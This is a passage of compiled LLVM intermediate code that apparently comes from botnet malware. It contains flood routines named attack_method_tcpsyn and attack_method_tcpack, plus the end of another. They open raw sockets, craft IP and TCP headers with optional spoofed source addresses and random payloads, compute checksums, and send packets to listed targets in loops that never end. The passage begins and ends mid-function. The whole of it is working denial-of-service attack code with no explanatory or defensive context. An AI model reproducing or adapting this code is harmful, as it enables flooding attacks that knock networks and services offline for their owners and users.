  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %14 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 1024)
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = bitcast %struct.sockaddr_in* %5 to i8*
  call void @llvm.memset.p0i8.i64(i8* nonnull %17, i8 0, i64 16, i32 4, i1 false)
  %18 = and i32 %13, 65535
  %19 = icmp eq i32 %18, 65535
  br i1 %19, label %23, label %20

; <label>:20:                                     ; preds = %4
  %21 = trunc i32 %13 to i16
  %22 = tail call zeroext i16 @htons(i16 zeroext %21) #11
  br label %23

; <label>:23:                                     ; preds = %4, %20
  %.058 = phi i16 [ %22, %20 ], [ 0, %4 ]
  %24 = zext i8 %0 to i32
  %25 = icmp eq i8 %0, 0
  br i1 %25, label %.preheader, label %.lr.ph62

.lr.ph62:                                         ; preds = %23
  %26 = and i32 %11, 65535
  %27 = icmp eq i32 %26, 65535
  %28 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 0
  %29 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 1
  %30 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %5, i64 0, i32 2, i32 0
  %31 = bitcast %struct.sockaddr_in* %5 to %struct.sockaddr*
  %32 = zext i8 %0 to i64
  br label %35

.preheader.loopexit:                              ; preds = %59
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %23
  %33 = icmp ne i8 %0, 0
  %.mask = and i32 %14, 65535
  %34 = zext i32 %.mask to i64
  br label %.loopexit

; <label>:35:                                     ; preds = %.lr.ph62, %59
  %indvars.iv = phi i64 [ 0, %.lr.ph62 ], [ %indvars.iv.next, %59 ]
  %36 = call noalias i8* @calloc(i64 65535, i64 1) #10
  %37 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %36, i8** %37, align 8
  br i1 %27, label %40, label %38

; <label>:38:                                     ; preds = %35
  %39 = call zeroext i16 @htons(i16 zeroext %12) #11
  br label %40

; <label>:40:                                     ; preds = %35, %38
  %.sink = phi i16 [ %39, %38 ], [ 0, %35 ]
  %41 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv
  %42 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 1
  store i16 %.sink, i16* %42, align 2
  %43 = call i32 @socket(i32 2, i32 2, i32 0) #10
  %44 = getelementptr inbounds i32, i32* %10, i64 %indvars.iv
  store i32 %43, i32* %44, align 4
  %45 = icmp eq i32 %43, -1
  br i1 %45, label %46, label %47

; <label>:46:                                     ; preds = %40
  ret void

; <label>:47:                                     ; preds = %40
  store i16 2, i16* %28, align 4
  store i16 %.058, i16* %29, align 2
  store i32 0, i32* %30, align 4
  %48 = load i32, i32* %44, align 4
  %49 = call i32 @bind(i32 %48, %struct.sockaddr* nonnull %31, i32 16) #10
  %50 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 2
  %51 = load i8, i8* %50, align 4
  %52 = icmp ult i8 %51, 32
  br i1 %52, label %53, label %59

; <label>:53:                                     ; preds = %47
  %54 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %55 = load i32, i32* %54, align 4
  %56 = call i32 @ntohl(i32 %55) #11
  %57 = call i32 @htonl(i32 %56) #11
  %58 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 0, i32 2, i32 0
  store i32 %57, i32* %58, align 4
  br label %59

; <label>:59:                                     ; preds = %53, %47
  %60 = load i32, i32* %44, align 4
  %61 = bitcast %struct.attack_target* %41 to %struct.sockaddr*
  %62 = call i32 @connect(i32 %60, %struct.sockaddr* %61, i32 16) #10
  %indvars.iv.next = add nuw nsw i64 %indvars.iv, 1
  %63 = icmp slt i64 %indvars.iv.next, %32
  br i1 %63, label %35, label %.preheader.loopexit

.loopexit:                                        ; preds = %.loopexit, %.preheader
  br i1 %33, label %.lr.ph.preheader, label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  %64 = icmp eq i8 %16, 0
  %65 = and i32 %14, 65535
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %70
  %.160 = phi i32 [ %.mux, %70 ], [ 0, %.lr.ph.preheader ]
  %66 = sext i32 %.160 to i64
  %67 = getelementptr inbounds i8*, i8** %8, i64 %66
  %68 = load i8*, i8** %67, align 8
  br i1 %64, label %70, label %69

; <label>:69:                                     ; preds = %.lr.ph
  call void @rand_str(i8* %68, i32 %65)
  br label %70

; <label>:70:                                     ; preds = %.lr.ph, %69
  %71 = getelementptr inbounds i32, i32* %10, i64 %66
  %72 = load i32, i32* %71, align 4
  %73 = call i64 @send(i32 %72, i8* %68, i64 %34, i32 16384) #10
  %74 = add nsw i32 %.160, 1
  %75 = icmp slt i32 %74, %24
  %brmerge = or i1 %75, %33
  %.mux = select i1 %75, i32 %74, i32 0
  br i1 %brmerge, label %.lr.ph, label %infloop.preheader

infloop.preheader:                                ; preds = %70
  br label %infloop

infloop:                                          ; preds = %infloop.preheader, %infloop
  br label %infloop
}

; Function Attrs: argmemonly nounwind
declare void @llvm.memset.p0i8.i64(i8* nocapture writeonly, i8, i64, i32, i1) #6

; Function Attrs: nounwind
declare i32 @bind(i32, %struct.sockaddr*, i32) local_unnamed_addr #1

declare i32 @connect(i32, %struct.sockaddr*, i32) local_unnamed_addr #3

declare i64 @send(i32, i8*, i64, i32) local_unnamed_addr #3

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpsyn(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 1)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 0)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i8
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 0)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i16
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 1)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = load i32, i32* @LOCAL_ADDR, align 4
  %36 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %35)
  %37 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %38 = icmp eq i32 %37, -1
  br i1 %38, label %196, label %39

; <label>:39:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %40 = bitcast i32* %5 to i8*
  %41 = call i32 @setsockopt(i32 %37, i32 0, i32 3, i8* nonnull %40, i32 4) #10
  %42 = icmp eq i32 %41, -1
  br i1 %42, label %66, label %.preheader128

.preheader128:                                    ; preds = %39
  store i32 0, i32* %5, align 4
  %43 = zext i8 %0 to i32
  %44 = icmp eq i8 %0, 0
  br i1 %44, label %.preheader, label %.lr.ph130

.lr.ph130:                                        ; preds = %.preheader128
  %45 = icmp eq i8 %16, 0
  %46 = trunc i32 %21 to i16
  %47 = and i8 %24, 1
  %48 = zext i8 %47 to i16
  %49 = shl nuw nsw i16 %48, 13
  %50 = shl i16 %26, 12
  %51 = and i16 %50, 4096
  %52 = shl i16 %28, 11
  %53 = and i16 %52, 2048
  %54 = shl i16 %30, 10
  %55 = and i16 %54, 1024
  %56 = shl i16 %32, 9
  %57 = and i16 %56, 512
  %58 = shl i16 %34, 8
  %59 = and i16 %58, 256
  %60 = or i16 %49, %51
  %61 = or i16 %60, %53
  %62 = or i16 %61, %55
  %.masked = or i16 %62, %57
  %63 = or i16 %.masked, %59
  %.promoted = load i32, i32* %5, align 4
  %64 = sext i32 %.promoted to i64
  %65 = zext i8 %0 to i64
  br label %80

; <label>:66:                                     ; preds = %39
  %67 = call i32 @close(i32 %37) #10
  br label %196

..preheader_crit_edge:                            ; preds = %97
  %68 = trunc i64 %indvars.iv.next to i32
  store i32 %68, i32* %5, align 4
  br label %.preheader

.preheader:                                       ; preds = %.preheader128, %..preheader_crit_edge
  %69 = icmp eq i8 %0, 0
  %70 = icmp eq i32 %36, -1
  %71 = and i32 %11, 65535
  %72 = icmp eq i32 %71, 65535
  %73 = and i32 %17, 65535
  %74 = icmp eq i32 %73, 65535
  %75 = and i32 %19, 65535
  %76 = icmp eq i32 %75, 65535
  %77 = icmp eq i32 %21, 65535
  %78 = icmp eq i32 %22, 65535
  %79 = icmp eq i8 %24, 0
  br label %.loopexit

; <label>:80:                                     ; preds = %.lr.ph130, %97
  %indvars.iv = phi i64 [ %64, %.lr.ph130 ], [ %indvars.iv.next, %97 ]
  %81 = call noalias i8* @calloc(i64 128, i64 1) #10
  %82 = getelementptr inbounds i8*, i8** %8, i64 %indvars.iv
  store i8* %81, i8** %82, align 8
  %83 = getelementptr inbounds i8, i8* %81, i64 20
  %84 = getelementptr inbounds i8, i8* %81, i64 40
  store i8 69, i8* %81, align 4
  %85 = getelementptr inbounds i8, i8* %81, i64 1
  store i8 %10, i8* %85, align 1
  %86 = call zeroext i16 @htons(i16 zeroext 60) #11
  %87 = getelementptr inbounds i8, i8* %81, i64 2
  %88 = bitcast i8* %87 to i16*
  store i16 %86, i16* %88, align 2
  %89 = call zeroext i16 @htons(i16 zeroext %12) #11
  %90 = getelementptr inbounds i8, i8* %81, i64 4
  %91 = bitcast i8* %90 to i16*
  store i16 %89, i16* %91, align 4
  %92 = getelementptr inbounds i8, i8* %81, i64 8
  store i8 %14, i8* %92, align 4
  br i1 %45, label %97, label %93

; <label>:93:                                     ; preds = %80
  %94 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %95 = getelementptr inbounds i8, i8* %81, i64 6
  %96 = bitcast i8* %95 to i16*
  store i16 %94, i16* %96, align 2
  br label %97

; <label>:97:                                     ; preds = %80, %93
  %98 = getelementptr inbounds i8, i8* %81, i64 9
  store i8 6, i8* %98, align 1
  %99 = getelementptr inbounds i8, i8* %81, i64 12
  %100 = bitcast i8* %99 to i32*
  store i32 %36, i32* %100, align 4
  %101 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %indvars.iv, i32 1
  %102 = load i32, i32* %101, align 4
  %103 = getelementptr inbounds i8, i8* %81, i64 16
  %104 = bitcast i8* %103 to i32*
  store i32 %102, i32* %104, align 4
  %105 = call zeroext i16 @htons(i16 zeroext %18) #11
  %106 = bitcast i8* %83 to i16*
  store i16 %105, i16* %106, align 4
  %107 = call zeroext i16 @htons(i16 zeroext %20) #11
  %108 = getelementptr inbounds i8, i8* %81, i64 22
  %109 = bitcast i8* %108 to i16*
  store i16 %107, i16* %109, align 2
  %110 = call zeroext i16 @htons(i16 zeroext %46) #11
  %111 = zext i16 %110 to i32
  %112 = getelementptr inbounds i8, i8* %81, i64 24
  %113 = bitcast i8* %112 to i32*
  store i32 %111, i32* %113, align 4
  %114 = getelementptr inbounds i8, i8* %81, i64 32
  %115 = bitcast i8* %114 to i16*
  %116 = load i16, i16* %115, align 4
  %117 = and i16 %116, -16369
  %118 = or i16 %63, %117
  %119 = or i16 %118, 160
  store i16 %119, i16* %115, align 4
  %120 = getelementptr inbounds i8, i8* %81, i64 41
  store i8 2, i8* %84, align 1
  %121 = getelementptr inbounds i8, i8* %81, i64 42
  store i8 4, i8* %120, align 1
  %122 = call zeroext i16 @htons(i16 zeroext 1400) #11
  %123 = bitcast i8* %121 to i16*
  store i16 %122, i16* %123, align 2
  %124 = getelementptr inbounds i8, i8* %81, i64 44
  %125 = getelementptr inbounds i8, i8* %81, i64 45
  store i8 4, i8* %124, align 1
  %126 = getelementptr inbounds i8, i8* %81, i64 46
  store i8 2, i8* %125, align 1
  %127 = getelementptr inbounds i8, i8* %81, i64 47
  store i8 8, i8* %126, align 1
  store i8 10, i8* %127, align 1
  %128 = getelementptr inbounds i8, i8* %81, i64 56
  %129 = getelementptr inbounds i8, i8* %81, i64 57
  store i8 1, i8* %128, align 1
  %130 = getelementptr inbounds i8, i8* %81, i64 58
  store i8 3, i8* %129, align 1
  %131 = getelementptr inbounds i8, i8* %81, i64 59
  store i8 3, i8* %130, align 1
  store i8 6, i8* %131, align 1
  %indvars.iv.next = add nsw i64 %indvars.iv, 1
  %132 = icmp slt i64 %indvars.iv.next, %65
  br i1 %132, label %80, label %..preheader_crit_edge

.loopexit.loopexit:                               ; preds = %175
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %69, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %175
  %storemerge122129 = phi i32 [ %194, %175 ], [ 0, %.lr.ph.preheader ]
  %133 = sext i32 %storemerge122129 to i64
  %134 = getelementptr inbounds i8*, i8** %8, i64 %133
  %135 = load i8*, i8** %134, align 8
  %136 = bitcast i8* %135 to %struct.iphdr*
  %137 = getelementptr inbounds i8, i8* %135, i64 20
  %138 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %133, i32 2
  %139 = load i8, i8* %138, align 4
  %140 = icmp ult i8 %139, 32
  br i1 %140, label %141, label %148

; <label>:141:                                    ; preds = %.lr.ph
  %142 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %133, i32 1
  %143 = load i32, i32* %142, align 4
  %144 = call i32 @ntohl(i32 %143) #11
  %145 = call i32 @htonl(i32 %144) #11
  %146 = getelementptr inbounds i8, i8* %135, i64 16
  %147 = bitcast i8* %146 to i32*
  store i32 %145, i32* %147, align 4
  br label %148

; <label>:148:                                    ; preds = %141, %.lr.ph
  br i1 %70, label %149, label %152

; <label>:149:                                    ; preds = %148
  %150 = getelementptr inbounds i8, i8* %135, i64 12
  %151 = bitcast i8* %150 to i32*
  store i32 0, i32* %151, align 4
  br label %152

; <label>:152:                                    ; preds = %149, %148
  br i1 %72, label %153, label %156

; <label>:153:                                    ; preds = %152
  %154 = getelementptr inbounds i8, i8* %135, i64 4
  %155 = bitcast i8* %154 to i16*
  store i16 0, i16* %155, align 4
  br label %156

; <label>:156:                                    ; preds = %153, %152
  br i1 %74, label %157, label %159

; <label>:157:                                    ; preds = %156
  %158 = bitcast i8* %137 to i16*
  store i16 0, i16* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %157, %156
  br i1 %76, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %135, i64 22
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 2
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %167

; <label>:164:                                    ; preds = %163
  %165 = getelementptr inbounds i8, i8* %135, i64 24
  %166 = bitcast i8* %165 to i32*
  store i32 0, i32* %166, align 4
  br label %167

; <label>:167:                                    ; preds = %164, %163
  br i1 %78, label %168, label %171

; <label>:168:                                    ; preds = %167
  %169 = getelementptr inbounds i8, i8* %135, i64 28
  %170 = bitcast i8* %169 to i32*
  store i32 0, i32* %170, align 4
  br label %171

; <label>:171:                                    ; preds = %168, %167
  br i1 %79, label %175, label %172

; <label>:172:                                    ; preds = %171
  %173 = getelementptr inbounds i8, i8* %135, i64 38
  %174 = bitcast i8* %173 to i16*
  store i16 0, i16* %174, align 2
  br label %175

; <label>:175:                                    ; preds = %171, %172
  %176 = getelementptr inbounds i8, i8* %135, i64 10
  %177 = bitcast i8* %176 to i16*
  store i16 0, i16* %177, align 2
  %178 = bitcast i8* %135 to i16*
  %179 = call zeroext i16 @checksum_generic(i16* %178, i32 20)
  store i16 %179, i16* %177, align 2
  %180 = getelementptr inbounds i8, i8* %135, i64 36
  %181 = bitcast i8* %180 to i16*
  store i16 0, i16* %181, align 4
  %182 = call zeroext i16 @htons(i16 zeroext 40) #11
  %183 = call zeroext i16 @checksum_tcpudp(%struct.iphdr* %136, i8* %137, i16 zeroext %182, i32 40)
  store i16 %183, i16* %181, align 4
  %184 = getelementptr inbounds i8, i8* %135, i64 22
  %185 = bitcast i8* %184 to i16*
  %186 = load i16, i16* %185, align 2
  %187 = load i32, i32* %5, align 4
  %188 = sext i32 %187 to i64
  %189 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0, i32 1
  store i16 %186, i16* %189, align 2
  %190 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %188, i32 0
  %191 = bitcast %struct.sockaddr_in* %190 to %struct.sockaddr*
  %192 = call i64 @sendto(i32 %37, i8* %135, i64 60, i32 16384, %struct.sockaddr* %191, i32 16) #10
  %193 = load i32, i32* %5, align 4
  %194 = add nsw i32 %193, 1
  store i32 %194, i32* %5, align 4
  %195 = icmp slt i32 %194, %43
  br i1 %195, label %.lr.ph, label %.loopexit.loopexit

; <label>:196:                                    ; preds = %4, %66
  ret void
}

; Function Attrs: noinline nounwind uwtable
define void @attack_method_tcpack(i8 zeroext, %struct.attack_target*, i8 zeroext, %struct.attack_option* nocapture readonly) #0 {
  %5 = alloca i32, align 4
  %6 = zext i8 %0 to i64
  %7 = tail call noalias i8* @calloc(i64 %6, i64 8) #10
  %8 = bitcast i8* %7 to i8**
  %9 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 2, i32 0)
  %10 = trunc i32 %9 to i8
  %11 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 3, i32 65535)
  %12 = trunc i32 %11 to i16
  %13 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 4, i32 64)
  %14 = trunc i32 %13 to i8
  %15 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 5, i32 0)
  %16 = trunc i32 %15 to i8
  %17 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 6, i32 65535)
  %18 = trunc i32 %17 to i16
  %19 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 7, i32 65535)
  %20 = trunc i32 %19 to i16
  %21 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 17, i32 65535)
  %22 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 18, i32 65535)
  %23 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 11, i32 0)
  %24 = trunc i32 %23 to i16
  %25 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 12, i32 1)
  %26 = trunc i32 %25 to i16
  %27 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 13, i32 0)
  %28 = trunc i32 %27 to i8
  %29 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 14, i32 0)
  %30 = trunc i32 %29 to i16
  %31 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 15, i32 0)
  %32 = trunc i32 %31 to i16
  %33 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 16, i32 0)
  %34 = trunc i32 %33 to i16
  %35 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 0, i32 512)
  %36 = tail call i32 @attack_get_opt_int(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 1, i32 1)
  %37 = trunc i32 %36 to i8
  %38 = load i32, i32* @LOCAL_ADDR, align 4
  %39 = tail call i32 @attack_get_opt_ip(i8 zeroext %2, %struct.attack_option* %3, i8 zeroext 25, i32 %38)
  %40 = tail call i32 @socket(i32 2, i32 3, i32 6) #10
  %41 = icmp eq i32 %40, -1
  br i1 %41, label %201, label %42

; <label>:42:                                     ; preds = %4
  store i32 1, i32* %5, align 4
  %43 = bitcast i32* %5 to i8*
  %44 = call i32 @setsockopt(i32 %40, i32 0, i32 3, i8* nonnull %43, i32 4) #10
  %45 = icmp eq i32 %44, -1
  br i1 %45, label %70, label %.preheader127

.preheader127:                                    ; preds = %42
  store i32 0, i32* %5, align 4
  %46 = zext i8 %0 to i32
  %47 = icmp eq i8 %0, 0
  br i1 %47, label %.preheader, label %.lr.ph129

.lr.ph129:                                        ; preds = %.preheader127
  %48 = trunc i32 %35 to i16
  %49 = add i16 %48, 40
  %50 = icmp eq i8 %16, 0
  %51 = trunc i32 %21 to i16
  %52 = shl i16 %24, 13
  %53 = and i16 %52, 8192
  %54 = shl i16 %26, 12
  %55 = and i16 %54, 4096
  %56 = and i8 %28, 1
  %57 = zext i8 %56 to i16
  %58 = shl nuw nsw i16 %57, 11
  %59 = shl i16 %30, 10
  %60 = and i16 %59, 1024
  %61 = shl i16 %32, 9
  %62 = and i16 %61, 512
  %63 = shl i16 %34, 8
  %64 = and i16 %63, 256
  %65 = or i16 %53, %55
  %66 = or i16 %65, %58
  %67 = or i16 %66, %60
  %.masked = or i16 %67, %62
  %68 = or i16 %.masked, %64
  %69 = icmp eq i8 %28, 0
  br label %88

; <label>:70:                                     ; preds = %42
  %71 = call i32 @close(i32 %40) #10
  br label %201

.preheader.loopexit:                              ; preds = %135
  br label %.preheader

.preheader:                                       ; preds = %.preheader.loopexit, %.preheader127
  %72 = icmp eq i8 %0, 0
  %73 = icmp eq i32 %39, -1
  %74 = and i32 %11, 65535
  %75 = icmp eq i32 %74, 65535
  %76 = and i32 %17, 65535
  %77 = icmp eq i32 %76, 65535
  %78 = and i32 %19, 65535
  %79 = icmp eq i32 %78, 65535
  %80 = icmp eq i32 %21, 65535
  %81 = icmp eq i32 %22, 65535
  %82 = icmp eq i8 %37, 0
  %83 = sext i32 %35 to i64
  %84 = add nsw i64 %83, 20
  %85 = trunc i64 %84 to i16
  %86 = trunc i64 %84 to i32
  %87 = add nsw i64 %83, 40
  br label %.loopexit

; <label>:88:                                     ; preds = %.lr.ph129, %135
  %89 = call noalias i8* @calloc(i64 1510, i64 1) #10
  %90 = load i32, i32* %5, align 4
  %91 = sext i32 %90 to i64
  %92 = getelementptr inbounds i8*, i8** %8, i64 %91
  store i8* %89, i8** %92, align 8
  %93 = getelementptr inbounds i8, i8* %89, i64 20
  %94 = getelementptr inbounds i8, i8* %89, i64 40
  store i8 69, i8* %89, align 4
  %95 = getelementptr inbounds i8, i8* %89, i64 1
  store i8 %10, i8* %95, align 1
  %96 = call zeroext i16 @htons(i16 zeroext %49) #11
  %97 = getelementptr inbounds i8, i8* %89, i64 2
  %98 = bitcast i8* %97 to i16*
  store i16 %96, i16* %98, align 2
  %99 = call zeroext i16 @htons(i16 zeroext %12) #11
  %100 = getelementptr inbounds i8, i8* %89, i64 4
  %101 = bitcast i8* %100 to i16*
  store i16 %99, i16* %101, align 4
  %102 = getelementptr inbounds i8, i8* %89, i64 8
  store i8 %14, i8* %102, align 4
  br i1 %50, label %107, label %103

; <label>:103:                                    ; preds = %88
  %104 = call zeroext i16 @htons(i16 zeroext 16384) #11
  %105 = getelementptr inbounds i8, i8* %89, i64 6
  %106 = bitcast i8* %105 to i16*
  store i16 %104, i16* %106, align 2
  br label %107

; <label>:107:                                    ; preds = %88, %103
  %108 = getelementptr inbounds i8, i8* %89, i64 9
  store i8 6, i8* %108, align 1
  %109 = getelementptr inbounds i8, i8* %89, i64 12
  %110 = bitcast i8* %109 to i32*
  store i32 %39, i32* %110, align 4
  %111 = load i32, i32* %5, align 4
  %112 = sext i32 %111 to i64
  %113 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %112, i32 1
  %114 = load i32, i32* %113, align 4
  %115 = getelementptr inbounds i8, i8* %89, i64 16
  %116 = bitcast i8* %115 to i32*
  store i32 %114, i32* %116, align 4
  %117 = call zeroext i16 @htons(i16 zeroext %18) #11
  %118 = bitcast i8* %93 to i16*
  store i16 %117, i16* %118, align 4
  %119 = call zeroext i16 @htons(i16 zeroext %20) #11
  %120 = getelementptr inbounds i8, i8* %89, i64 22
  %121 = bitcast i8* %120 to i16*
  store i16 %119, i16* %121, align 2
  %122 = call zeroext i16 @htons(i16 zeroext %51) #11
  %123 = zext i16 %122 to i32
  %124 = getelementptr inbounds i8, i8* %89, i64 24
  %125 = bitcast i8* %124 to i32*
  store i32 %123, i32* %125, align 4
  %126 = getelementptr inbounds i8, i8* %89, i64 32
  %127 = bitcast i8* %126 to i16*
  %128 = load i16, i16* %127, align 4
  %129 = and i16 %128, -16369
  %130 = or i16 %68, %129
  %131 = or i16 %130, 80
  store i16 %131, i16* %127, align 4
  br i1 %69, label %135, label %132

; <label>:132:                                    ; preds = %107
  %133 = load i16, i16* %127, align 4
  %134 = or i16 %133, 2048
  store i16 %134, i16* %127, align 4
  br label %135

; <label>:135:                                    ; preds = %107, %132
  call void @rand_str(i8* nonnull %94, i32 %35)
  %136 = load i32, i32* %5, align 4
  %137 = add nsw i32 %136, 1
  store i32 %137, i32* %5, align 4
  %138 = icmp slt i32 %137, %46
  br i1 %138, label %88, label %.preheader.loopexit

.loopexit.loopexit:                               ; preds = %180
  br label %.loopexit.backedge

.loopexit:                                        ; preds = %.loopexit.backedge, %.preheader
  store i32 0, i32* %5, align 4
  br i1 %72, label %.loopexit.backedge, label %.lr.ph.preheader

.loopexit.backedge:                               ; preds = %.loopexit, %.loopexit.loopexit
  br label %.loopexit

.lr.ph.preheader:                                 ; preds = %.loopexit
  br label %.lr.ph

.lr.ph:                                           ; preds = %.lr.ph.preheader, %180
  %storemerge121128 = phi i32 [ %199, %180 ], [ 0, %.lr.ph.preheader ]
  %139 = sext i32 %storemerge121128 to i64
  %140 = getelementptr inbounds i8*, i8** %8, i64 %139
  %141 = load i8*, i8** %140, align 8
  %142 = bitcast i8* %141 to %struct.iphdr*
  %143 = getelementptr inbounds i8, i8* %141, i64 20
  %144 = getelementptr inbounds i8, i8* %141, i64 40
  %145 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 2
  %146 = load i8, i8* %145, align 4
  %147 = icmp ult i8 %146, 32
  br i1 %147, label %148, label %155

; <label>:148:                                    ; preds = %.lr.ph
  %149 = getelementptr inbounds %struct.attack_target, %struct.attack_target* %1, i64 %139, i32 1
  %150 = load i32, i32* %149, align 4
  %151 = call i32 @ntohl(i32 %150) #11
  %152 = call i32 @htonl(i32 %151) #11
  %153 = getelementptr inbounds i8, i8* %141, i64 16
  %154 = bitcast i8* %153 to i32*
  store i32 %152, i32* %154, align 4
  br label %155

; <label>:155:                                    ; preds = %148, %.lr.ph
  br i1 %73, label %156, label %159

; <label>:156:                                    ; preds = %155
  %157 = getelementptr inbounds i8, i8* %141, i64 12
  %158 = bitcast i8* %157 to i32*
  store i32 0, i32* %158, align 4
  br label %159

; <label>:159:                                    ; preds = %156, %155
  br i1 %75, label %160, label %163

; <label>:160:                                    ; preds = %159
  %161 = getelementptr inbounds i8, i8* %141, i64 4
  %162 = bitcast i8* %161 to i16*
  store i16 0, i16* %162, align 4
  br label %163

; <label>:163:                                    ; preds = %160, %159
  br i1 %77, label %164, label %166

; <label>:164:                                    ; preds = %163
  %165 = bitcast i8* %143 to i16*
  store i16 0, i16* %165, align 4
  br label %166

; <label>:166:                                    ; preds = %164, %163
  br i1 %79, label %167, label %170

; <label>:167:                                    ; preds = %166
  %168 = getelementptr inbounds i8, i8* %141, i64 22
